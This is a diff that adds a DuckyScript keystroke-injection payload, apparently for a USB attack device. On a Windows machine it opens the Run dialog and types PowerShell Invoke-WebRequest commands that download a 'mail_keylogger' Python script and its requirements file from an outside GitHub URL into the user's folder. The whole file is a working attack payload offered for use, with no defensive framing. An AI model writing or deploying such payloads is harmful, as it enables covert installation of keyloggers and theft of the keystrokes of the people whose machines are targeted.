@@ -1,0 +1,16 @@
+DEFINE #SCRIPTURL1 https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/mail_keylogger/script.py
+DEFINE #SCRIPTURL2 https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/mail_keylogger/requirements.txt
+
+GUI r
+DELAY 2000
+STRING powershell Invoke-WebRequest -Uri #SCRIPTURL2 -OutFile C:/Users/$env:UserName\requirements.txt
+ENTER
+DELAY 3000
+STRING exit
+
+GUI r
+DELAY 2000
+STRING powershell Invoke-WebRequest -Uri #SCRIPTURL1 -OutFile C:/Users/$env:UserName\script.py
+ENTER
+DELAY 3000
+STRING exit
